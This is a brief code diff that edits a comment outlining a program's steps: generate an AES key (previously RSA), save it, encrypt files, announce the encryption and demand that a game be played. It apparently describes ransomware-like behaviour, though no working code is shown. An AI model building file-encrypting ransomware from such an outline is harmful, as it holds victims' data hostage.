@@ -5,8 +5,8 @@
 /*
 * Steps of the program
 *
-* 1- Generate RSA key
-* 2- Write RSA key to file to prevent accidental wrong encryption
+* 1- Generate AES key
+* 2- Write AES key to file to prevent accidental wrong encryption
 * 3- Encrypt files
 * 4- Show message that files were encrypted
 * 5- Ask that the game can be played
